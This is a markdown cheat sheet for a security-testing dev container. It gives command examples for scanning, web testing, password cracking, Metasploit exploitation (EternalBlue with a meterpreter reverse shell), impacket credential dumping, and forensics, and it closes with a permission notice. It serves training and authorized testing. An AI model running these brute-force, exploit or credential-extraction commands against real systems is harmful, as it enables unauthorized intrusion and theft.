# Tool Usage Examples

This guide provides practical examples of using common security tools in the dev container.

## Table of Contents

1. [Network Scanning](#network-scanning)
2. [Web Application Testing](#web-application-testing)
3. [Password Cracking](#password-cracking)
4. [Exploitation](#exploitation)
5. [Forensics](#forensics)
6. [Custom Tool Development](#custom-tool-development)

## Network Scanning

### Nmap

```bash
# Quick scan (top 1000 ports)
nmap -T4 -F target.com

# Full TCP port scan
nmap -p- target.com

# Service and version detection
nmap -sV target.com

# OS detection (requires root/sudo)
sudo nmap -O target.com

# Aggressive scan (OS, version, scripts, traceroute)
sudo nmap -A target.com

# Scan multiple hosts
nmap 192.168.1.1-254

# Scan from file
nmap -iL targets.txt

# Output to file
nmap target.com -oN scan.txt -oX scan.xml

# NSE script categories
nmap --script vuln target.com
nmap --script discovery target.com
nmap --script auth target.com

# Specific NSE scripts
nmap --script http-enum target.com
nmap --script smb-vuln-* target.com
```

### Masscan

```bash
# Fast scan (requires root)
sudo masscan -p1-65535 192.168.1.0/24 --rate=1000

# Scan specific ports
sudo masscan -p80,443,8080 192.168.1.0/24

# Banner grabbing
sudo masscan --banners -p80,443 192.168.1.0/24
```

### DNS Enumeration

```bash
# Subdomain enumeration
dnsenum domain.com

# DNS reconnaissance
dnsrecon -d domain.com -t std

# Subdomain brute force
sublist3r -d domain.com

# Fast subdomain discovery
amass enum -d domain.com
```

### Network Discovery

```bash
# ARP scan (local network, requires root)
sudo arp-scan --localnet
sudo arp-scan --interface=eth0 192.168.1.0/24

# NetDiscover
sudo netdiscover -r 192.168.1.0/24
```

## Web Application Testing

### Directory and File Discovery

```bash
# Gobuster directory brute force
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt

# With extensions
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# Subdomain enumeration
gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt

# FFuF (faster alternative)
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# With filters
ffuf -u https://target.com/FUZZ -w wordlist.txt -fc 404,403

# WFuzz
wfuzz -c -z file,wordlist.txt --hc 404 https://target.com/FUZZ
```

### Web Server Scanning

```bash
# Nikto web server scanner
nikto -h https://target.com

# With tuning options
nikto -h https://target.com -Tuning 1234

# Scan through proxy
nikto -h https://target.com -useproxy http://127.0.0.1:8080

# WhatWeb fingerprinting
whatweb target.com

# Aggressive mode
whatweb -a 3 target.com
```

### SQL Injection

```bash
# Basic SQLMap
sqlmap -u "https://target.com/page?id=1"

# With authentication
sqlmap -u "https://target.com/page?id=1" --cookie="session=abc123"

# POST data
sqlmap -u "https://target.com/login" --data="username=admin&password=test"

# Enumerate databases
sqlmap -u "https://target.com/page?id=1" --dbs

# Dump specific database
sqlmap -u "https://target.com/page?id=1" -D database_name --dump

# Batch mode (no prompts)
sqlmap -u "https://target.com/page?id=1" --batch

# Proxy through Burp
sqlmap -u "https://target.com/page?id=1" --proxy=http://127.0.0.1:8080
```

### XSS Testing

```bash
# XSSer
xsser --url "https://target.com/search?q=test"

# DalFox
dalfox url https://target.com/search?q=test

# With pipe mode
echo "https://target.com/page?q=test" | dalfox pipe
```

### CMS Scanning

```bash
# WordPress scanning
wpscan --url https://target.com

# Enumerate users
wpscan --url https://target.com --enumerate u

# Enumerate plugins
wpscan --url https://target.com --enumerate p

# Enumerate themes
wpscan --url https://target.com --enumerate t

# With API token for vulnerability data
wpscan --url https://target.com --api-token YOUR_TOKEN

# Joomla scanning
joomscan -u https://target.com
```

## Password Cracking

### John the Ripper

```bash
# Crack password hash
john hashes.txt

# With wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt

# Crack with rules
john --wordlist=wordlist.txt --rules hashes.txt

# Specific format
john --format=raw-md5 hashes.txt
```

### Hashcat

```bash
# Crack MD5 hash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# Crack SHA256
hashcat -m 1400 -a 0 hash.txt wordlist.txt

# Brute force attack
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a?a?a

# Show cracked passwords
hashcat -m 0 hash.txt --show

# Hash modes:
# 0 = MD5
# 1000 = NTLM
# 1400 = SHA256
# 1800 = SHA512
# 3200 = bcrypt
```

### Hydra

```bash
# SSH brute force
hydra -l root -P wordlist.txt ssh://target.com

# FTP brute force
hydra -l admin -P wordlist.txt ftp://target.com

# HTTP POST form
hydra -l admin -P wordlist.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# Multiple users and passwords
hydra -L users.txt -P passwords.txt ssh://target.com

# Verbose mode
hydra -l admin -P wordlist.txt -V ssh://target.com
```

## Exploitation

### Metasploit Framework

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows

# Use an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show options
msf6 > show options

# Set options
msf6 > set RHOSTS 192.168.1.100
msf6 > set LHOST 192.168.1.50

# Select payload
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > set LPORT 4444

# Run exploit
msf6 > exploit

# Meterpreter commands
meterpreter > sysinfo
meterpreter > getuid
meterpreter > shell
meterpreter > download file.txt
meterpreter > upload tool.exe
```

### SearchSploit

```bash
# Search for exploits
searchsploit apache 2.4

# Search by CVE
searchsploit CVE-2021-1234

# Copy exploit to current directory
searchsploit -m 12345

# Search and display path
searchsploit -p 12345

# Update database
searchsploit -u
```

### Impacket Tools

```bash
# SMB enumeration
smbclient -L //target.com -N

# psexec (pass-the-hash)
impacket-psexec administrator@target.com

# secretsdump (extract credentials)
impacket-secretsdump domain/user:password@target.com

# wmiexec
impacket-wmiexec domain/user:password@target.com

# GetNPUsers (AS-REP roasting)
impacket-GetNPUsers domain.com/ -usersfile users.txt -format hashcat
```

## Forensics

### File Analysis

```bash
# View file type
file suspicious.exe

# Extract strings
strings suspicious.exe
strings -n 10 suspicious.exe  # Minimum length 10

# Hexdump
hexdump -C file.bin
xxd file.bin

# Binwalk (extract embedded files)
binwalk file.bin
binwalk -e file.bin  # Extract
binwalk --dd='.*' file.bin  # Extract all

# Foremost (file carving)
foremost -i disk.img -o output/
```

### Metadata Analysis

```bash
# ExifTool
exiftool image.jpg
exiftool -all= image.jpg  # Remove all metadata

# Multiple files
exiftool *.jpg
```

### Memory Forensics (Volatility)

```bash
# Identify profile
volatility3 -f memory.dmp windows.info

# List processes
volatility3 -f memory.dmp windows.pslist

# Process tree
volatility3 -f memory.dmp windows.pstree

# Network connections
volatility3 -f memory.dmp windows.netscan

# Command history
volatility3 -f memory.dmp windows.cmdline

# Dump process
volatility3 -f memory.dmp windows.dumpfiles --pid 1234
```

### Network Traffic Analysis

```bash
# Capture packets (requires root)
sudo tcpdump -i eth0 -w capture.pcap

# Filter by host
sudo tcpdump -i eth0 host 192.168.1.100

# Filter by port
sudo tcpdump -i eth0 port 80

# Read pcap file
tcpdump -r capture.pcap

# Tshark (Wireshark CLI)
tshark -i eth0 -w capture.pcap
tshark -r capture.pcap
tshark -r capture.pcap -Y "http.request"
```

## Custom Tool Development

### Python Port Scanner

```python
#!/usr/bin/env python3
import socket
import sys
from concurrent.futures import ThreadPoolExecutor

def scan_port(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        sock.close()
        return port if result == 0 else None
    except:
        return None

def scan_host(host, ports):
    print(f"Scanning {host}...")
    open_ports = []

    with ThreadPoolExecutor(max_workers=50) as executor:
        results = executor.map(lambda p: scan_port(host, p), ports)

    open_ports = [p for p in results if p is not None]

    if open_ports:
        print(f"Open ports: {', '.join(map(str, open_ports))}")
    else:
        print("No open ports found")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <host>")
        sys.exit(1)

    host = sys.argv[1]
    ports = range(1, 1001)
    scan_host(host, ports)
```

### Python HTTP Request Script

```python
#!/usr/bin/env python3
import requests

def check_url(url):
    try:
        response = requests.get(url, timeout=5, verify=False)
        print(f"Status: {response.status_code}")
        print(f"Headers: {response.headers}")
        print(f"Body length: {len(response.text)}")
        return response
    except Exception as e:
        print(f"Error: {e}")
        return None

if __name__ == "__main__":
    url = "https://example.com"
    check_url(url)
```

## Tips and Best Practices

### Output Management

```bash
# Save all output
nmap target.com -oA scan_results  # Saves in all formats

# Tee to file and stdout
nmap target.com | tee scan.txt

# Append to log
echo "Scan started: $(date)" >> scan.log
nmap target.com >> scan.log
```

### Wordlists

Common wordlist locations:
```bash
# Dirb wordlists
/usr/share/wordlists/dirb/

# SecLists (if installed)
/usr/share/seclists/

# RockYou
/usr/share/wordlists/rockyou.txt

# Create custom wordlist
crunch 6 8 -o wordlist.txt  # Generate 6-8 char combinations
```

### Proxy Configuration

```bash
# Set environment proxy
export HTTP_PROXY=http://127.0.0.1:8080
export HTTPS_PROXY=http://127.0.0.1:8080

# Tool-specific proxy
curl -x http://127.0.0.1:8080 https://target.com
nmap --proxy http://127.0.0.1:8080 target.com
```

## Legal and Ethical Considerations

⚠️ **IMPORTANT**: Always ensure you have explicit permission before:
- Scanning networks or systems
- Testing web applications
- Running exploits
- Performing password attacks
- Analyzing systems you don't own

Unauthorized access is illegal. Use these tools responsibly.

---

For more information, see:
- [Quick Start Guide](QUICKSTART.md)
- [Troubleshooting](TROUBLESHOOTING.md)
- [Contributing](../CONTRIBUTING.md)
